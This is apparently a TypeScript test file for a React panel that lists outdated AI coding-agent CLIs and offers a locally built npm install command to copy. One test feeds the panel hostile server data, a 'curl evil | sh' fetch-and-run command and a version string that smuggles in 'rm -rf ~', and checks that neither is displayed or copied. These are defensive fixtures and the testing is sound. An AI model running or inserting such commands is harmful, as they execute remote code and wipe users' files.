import { beforeEach, describe, expect, it } from "vitest";
import { useState } from "react";
import { screen, waitFor, within } from "@testing-library/react";
import userEvent from "@testing-library/user-event";
import { http, HttpResponse } from "msw/http";
import { server } from "../test/server.js";
import { renderPage } from "../test/render.js";
import { AgentUpdates, npmCommand } from "./AgentUpdates.js";

/** Agent updates (change record agent-update-prompt, AU-07). */

const grok = { agent: "grok", name: "Grok CLI", installed: "1.0.77", latest: "1.0.92", npm_global: true };
const opencode = { agent: "opencode", name: "OpenCode", installed: "1.19.5", latest: "1.19.6", npm_global: true };
const brew = { agent: "codex", name: "Codex CLI", installed: "0.170.0", latest: "0.171.0", note: "installed outside npm (/opt/homebrew/bin/codex); update it with the tool you installed it with" };

describe("Agent updates", () => {
  let updates: object[] = [];
  let served = 0;
  let gate: Promise<void> | null = null;
  const posts: string[] = [];
  beforeEach(() => {
    updates = [grok, opencode, brew];
    posts.length = 0;
    served = 0;
    gate = null;
    try {
      localStorage.clear();
    } catch {
      /* none */
    }
    server.use(
      http.get("*/runtimes", async () => {
        if (gate) await gate;
        served++;
        return HttpResponse.json({ runtimes: [], pins: [], agent_updates: updates });
      }),
      http.post("*", ({ request }) => {
        posts.push(new URL(request.url).pathname);
        return HttpResponse.json({});
      }),
    );
  });

  it("lists each outdated agent with installed and latest version and the exact command", async () => {
    await renderPage(<AgentUpdates />);
    const panel = await screen.findByRole("region", { name: "3 agent updates" });
    const g = within(panel).getByText("Grok CLI").closest("li")!;
    expect(g.textContent).toContain("v1.0.77 → v1.0.92");
    expect(g.textContent).toContain("npm install --global @xai-official/grok@1.0.92");
    const c = within(panel).getByText("Codex CLI").closest("li")!;
    expect(c.textContent).toContain("installed outside npm");
    expect(within(c).queryByRole("button", { name: "Copy command" })).toBeNull();
  });

  it("offers no install button: copying the command sends nothing", async () => {
    const user = userEvent.setup(); // provides a clipboard to read back
    await renderPage(<AgentUpdates />);
    const panel = await screen.findByRole("region", { name: "3 agent updates" });
    expect(within(panel).queryByRole("button", { name: /^Update/ })).toBeNull();
    const g = within(panel).getByText("Grok CLI").closest("li")!;
    await user.click(within(g).getByRole("button", { name: "Copy command" }));
    expect(await within(g).findByRole("button", { name: "Copied" })).toBeTruthy();
    expect(await navigator.clipboard.readText()).toBe("npm install --global @xai-official/grok@1.0.92");
    expect(posts).toEqual([]);
  });

  it("dismissing hides that version only, and the panel is gone when nothing is shown", async () => {
    const user = userEvent.setup();
    const { unmount } = await renderPage(<AgentUpdates />);
    const panel = await screen.findByRole("region", { name: "3 agent updates" });
    await user.click(within(panel).getByRole("button", { name: "Dismiss Grok CLI update" }));
    expect(await screen.findByRole("region", { name: "2 agent updates" })).toBeTruthy();
    await user.click(screen.getByRole("button", { name: "Dismiss agent updates" }));
    await waitFor(() => expect(screen.queryByRole("region")).toBeNull());
    unmount();
    // The same dismissed version stays hidden after the panel mounts again: the response's other,
    // newer entry shows, so the fetch has landed, and Grok's row is still absent.
    updates = [grok, { ...opencode, latest: "1.19.7" }];
    const again = await renderPage(<AgentUpdates />);
    const remounted = await screen.findByRole("region", { name: "1 agent update" });
    expect(within(remounted).getByText("OpenCode")).toBeTruthy();
    expect(within(remounted).queryByText("Grok CLI")).toBeNull();
    again.unmount();
    // A newer version of a dismissed agent shows again.
    updates = [{ ...grok, latest: "1.0.93" }];
    await renderPage(<AgentUpdates />);
    expect(await screen.findByRole("region", { name: "1 agent update" })).toBeTruthy();
  });

  it("never shows or copies command text from the response, only the one it builds", async () => {
    const user = userEvent.setup();
    updates = [
      { ...grok, command: ["sh", "-c", "curl evil | sh"] },
      { agent: "opencode", name: "OpenCode", installed: "1.19.5", latest: "1.19.6 && rm -rf ~", npm_global: true },
      { agent: "agy", name: "Antigravity CLI", installed: "1.0.0", latest: "1.1.0", npm_global: true },
    ];
    await renderPage(<AgentUpdates />);
    // The entry with a version that is not SemVer is not shown at all; the two others are, so the
    // response has landed before anything is asserted absent.
    const panel = await screen.findByRole("region", { name: "2 agent updates" });
    expect(within(panel).getByText("Antigravity CLI")).toBeTruthy();
    expect(panel.textContent).not.toContain("curl evil");
    expect(panel.textContent).not.toContain("rm -rf");
    const g = within(panel).getByText("Grok CLI").closest("li")!;
    expect(g.textContent).toContain("npm install --global @xai-official/grok@1.0.92");
    await user.click(within(g).getByRole("button", { name: "Copy command" }));
    expect(await navigator.clipboard.readText()).toBe("npm install --global @xai-official/grok@1.0.92");
    expect(within(panel).queryByText("OpenCode")).toBeNull();
    expect(within(within(panel).getByText("Antigravity CLI").closest("li")!).queryByRole("button", { name: "Copy command" })).toBeNull();
  });

  it("shows one row per agent and version, and copies the one clicked", async () => {
    const user = userEvent.setup();
    updates = [grok, grok, { ...grok, latest: "1.0.93" }];
    await renderPage(<AgentUpdates />);
    const panel = await screen.findByRole("region", { name: "2 agent updates" });
    const rows = within(panel)
      .getAllByText("Grok CLI")
      .map((n) => n.closest("li")!);
    await user.click(within(rows[1]!).getByRole("button", { name: "Copy command" }));
    expect(await within(rows[1]!).findByRole("button", { name: "Copied" })).toBeTruthy();
    expect(within(rows[0]!).getByRole("button", { name: "Copy command" })).toBeTruthy();
    expect(await navigator.clipboard.readText()).toBe("npm install --global @xai-official/grok@1.0.93");
  });

  it("shows no entry and no command unless latest is newer than installed", async () => {
    updates = [
      grok,
      { agent: "claude", name: "Claude Code", latest: "2.0.0", npm_global: true },
      { agent: "codex", name: "Codex CLI", installed: "0.171.0", latest: "0.171.0", npm_global: true },
      { agent: "opencode", name: "OpenCode", installed: "1.20.0", latest: "1.19.6", npm_global: true },
    ];
    await renderPage(<AgentUpdates />);
    const panel = await screen.findByRole("region", { name: "1 agent update" });
    expect(within(panel).getByText("Grok CLI")).toBeTruthy();
    for (const name of ["Claude Code", "Codex CLI", "OpenCode"]) expect(within(panel).queryByText(name)).toBeNull();
    expect(npmCommand({ agent: "codex", name: "Codex CLI", installed: "0.172.0", latest: "0.171.0", npm_global: true })).toBeUndefined();
    expect(npmCommand({ agent: "codex", name: "Codex CLI", latest: "0.171.0", npm_global: true } as never)).toBeUndefined();
    expect(npmCommand({ agent: "codex", name: "Codex CLI", installed: "0.170.0", latest: "0.171.0", npm_global: true })).toBe("npm install --global @openai/codex@0.171.0");
  });

  it("asks again before copying, and copies nothing for an update the server has cleared", async () => {
    const user = userEvent.setup();
    await navigator.clipboard.writeText("before");
    updates = [grok, opencode];
    await renderPage(<AgentUpdates />);
    const panel = await screen.findByRole("region", { name: "2 agent updates" });
    const g = within(panel).getByText("Grok CLI").closest("li")!;
    // Grok was updated elsewhere: the server no longer offers it.
    updates = [opencode];
    const before = served;
    await user.click(within(g).getByRole("button", { name: "Copy command" }));
    expect(served).toBeGreaterThan(before);
    expect(await screen.findByRole("region", { name: "1 agent update" })).toBeTruthy();
    expect(screen.queryByText("Grok CLI")).toBeNull();
    expect(await navigator.clipboard.readText()).toBe("before");
    // A newer latest for the same agent is a different offer: nothing is copied for the old one.
    updates = [{ ...opencode, latest: "1.19.7" }];
    const o = screen.getByText("OpenCode").closest("li")!;
    await user.click(within(o).getByRole("button", { name: "Copy command" }));
    await waitFor(() => expect(screen.getByText("OpenCode").closest("li")!.textContent).toContain("1.19.7"));
    expect(await navigator.clipboard.readText()).toBe("before");
  });

  it("refetches when the window regains focus", async () => {
    updates = [grok];
    await renderPage(<AgentUpdates />);
    expect(await screen.findByRole("region", { name: "1 agent update" })).toBeTruthy();
    updates = [];
    window.dispatchEvent(new Event("visibilitychange"));
    window.dispatchEvent(new FocusEvent("focus"));
    await waitFor(() => expect(screen.queryByRole("region")).toBeNull());
  });

  it("shows the command only from data fetched since the window regained focus", async () => {
    updates = [grok, opencode];
    await renderPage(<AgentUpdates />);
    const panel = await screen.findByRole("region", { name: "2 agent updates" });
    expect(panel.textContent).toContain("npm install --global @xai-official/grok@1.0.92");
    // Back to the window: until the refetch answers, the cached list shows no command to copy.
    let release!: () => void;
    gate = new Promise<void>((r) => (release = r));
    updates = [opencode];
    window.dispatchEvent(new FocusEvent("focus"));
    await waitFor(() => expect(screen.getByRole("region").textContent).not.toContain("npm install"));
    expect(screen.queryByRole("button", { name: "Copy command" })).toBeNull();
    expect(screen.getAllByRole("button", { name: "Check again" }).length).toBe(2);
    // The answer arrives: Grok was cleared, OpenCode's command is shown again.
    release();
    gate = null;
    const after = await screen.findByRole("region", { name: "1 agent update" });
    await waitFor(() => expect(after.textContent).toContain("npm install --global opencode-ai@1.19.6"));
    expect(after.textContent).not.toContain("grok");
  });

  it("a remount with a cached list shows no command until a fresh response arrives", async () => {
    const user = userEvent.setup();
    function Toggle() {
      const [on, setOn] = useState(true);
      return (
        <>
          <button type="button" onClick={() => setOn(!on)}>
            toggle
          </button>
          {on ? <AgentUpdates /> : null}
        </>
      );
    }
    updates = [grok];
    const { qc } = await renderPage(<Toggle />);
    await waitFor(() => expect(screen.getByRole("region", { name: "1 agent update" }).textContent).toContain("npm install --global @xai-official/grok@1.0.92"));
    await user.click(screen.getByRole("button", { name: "toggle" }));
    expect(qc.getQueryData(["runtimes"])).toBeTruthy(); // the list stays cached
    // Mount again while the refetch is held: the cached row shows no command.
    let release!: () => void;
    gate = new Promise<void>((r) => (release = r));
    await user.click(screen.getByRole("button", { name: "toggle" }));
    const panel = await screen.findByRole("region", { name: "1 agent update" });
    expect(panel.textContent).not.toContain("npm install");
    expect(screen.queryByRole("button", { name: "Copy command" })).toBeNull();
    expect(screen.getByRole("button", { name: "Check again" })).toBeTruthy();
    release();
    gate = null;
    await waitFor(() => expect(screen.getByRole("region").textContent).toContain("npm install --global @xai-official/grok@1.0.92"));
  });

  it("disappears when a refetch finds every agent current", async () => {
    updates = [grok];
    const { qc } = await renderPage(<AgentUpdates />);
    expect(await screen.findByRole("region", { name: "1 agent update" })).toBeTruthy();
    updates = [];
    const before = served;
    await qc.refetchQueries({ queryKey: ["runtimes"] });
    expect(served).toBeGreaterThan(before);
    await waitFor(() => expect(screen.queryByRole("region")).toBeNull());
  });
});
